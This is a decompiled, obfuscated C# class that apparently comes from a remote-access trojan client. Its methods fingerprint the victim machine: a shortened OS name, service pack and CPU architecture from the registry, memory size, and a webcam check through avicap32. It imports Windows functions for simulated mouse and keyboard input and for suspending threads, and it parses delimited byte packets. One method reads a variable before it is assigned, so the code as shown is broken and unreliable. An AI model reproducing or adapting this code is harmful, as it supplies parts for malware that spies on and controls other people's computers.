using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns2;

namespace ns5;

internal sealed class Class12
{
	public enum Enum1
	{
		const_0 = 1,
		const_1 = 2,
		const_2 = 8,
		const_3 = 0x10,
		const_4 = 0x20,
		const_5 = 0x40,
		const_6 = 0x80,
		const_7 = 0x100,
		const_8 = 0x200
	}

	private static string string_0 = ((ServerComputer)Class7.smethod_0()).get_Info().get_OSFullName().Replace("Microsoft", "")
		.Replace("Windows", "Win")
		.Replace("®", "")
		.Replace("™", "")
		.Replace("  ", " ")
		.Replace(" Win", "Win");

	public static object object_0 = new FileInfo(Application.get_ExecutablePath());

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int int_0, int int_1, int int_2, int int_3, int int_4);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void keybd_event(byte byte_0, byte byte_1, int int_0, int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MapVirtualKeyA(int int_0, int int_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr OpenThread(Enum1 enum1_0, bool bool_0, uint uint_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern uint SuspendThread(IntPtr intptr_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, int int_1);

	public static Array smethod_0(byte[] byte_0, string string_1)
	{
		object obj = new List<byte[]>();
		object obj2 = new MemoryStream();
		object obj3 = new MemoryStream();
		string[] array = Strings.Split(smethod_6(ref byte_0), string_1, -1, (CompareMethod)0);
		object[] array2 = new object[3]
		{
			byte_0,
			0,
			array[0].Length
		};
		object[] array3 = array2;
		bool[] array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj2, (Type)null, "Write", array3, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
		}
		object[] array5 = checked(new object[3]
		{
			byte_0,
			array[0].Length + string_1.Length,
			byte_0.Length - (array[0].Length + string_1.Length)
		});
		object[] array6 = array5;
		array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj3, (Type)null, "Write", array6, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
		}
		array2 = new object[1];
		object[] array7 = array2;
		object obj4 = obj2;
		array7[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
		array5 = array2;
		object[] array8 = array5;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, "Add", array8, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array5[0]) }, (string[])null, (Type[])null, true, false);
		}
		object[] array9 = new object[1];
		object[] array10 = array9;
		obj4 = obj3;
		array10[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
		array2 = array9;
		object[] array11 = array2;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, "Add", array11, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
		}
		NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(obj3, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		return (Array)NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
	}

	public static string smethod_1()
	{
		_ = Environment.OSVersion;
		string text = text + " SP";
		string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
		if (array.Length == 1)
		{
			text += "0";
		}
		text += array[checked(array.Length - 1)];
		if (Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0")!.GetValue("Identifier")!.ToString()!.Contains("x86"))
		{
			return text + " x86";
		}
		return text + " x64";
	}

	public static string smethod_2()
	{
		string result = "";
		checked
		{
			long num = (long)Math.Round(Conversion.Val((object)((ServerComputer)Class7.smethod_0()).get_Info().get_TotalPhysicalMemory()));
			if (num > 1073741824L)
			{
				result = ((double)num / 1073741824.0).ToString();
				result = result.Remove(4, result.Length - 4) + " GB";
			}
			else if (num > 1048576L)
			{
				result = ((double)num / 1048576.0).ToString();
				result = result.Remove(4, result.Length - 4) + " Mo";
			}
			return result;
		}
	}

	public static string smethod_3()
	{
		try
		{
			return ((FileInfo)object_0).LastWriteTime.ToString("yyyy-MM-dd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "unknown";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_4()
	{
		checked
		{
			try
			{
				string string_ = Strings.Space(100);
				int num = 0;
				do
				{
					short short_ = (short)num;
					string string_2 = null;
					if (!capGetDriverDescriptionA(short_, ref string_, 100, ref string_2, 100))
					{
						num++;
						continue;
					}
					return "Yes";
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return "No";
		}
	}

	public static byte[] smethod_5(ref string string_1)
	{
		return Encoding.Default.GetBytes(string_1);
	}

	public static string smethod_6(ref byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}
}
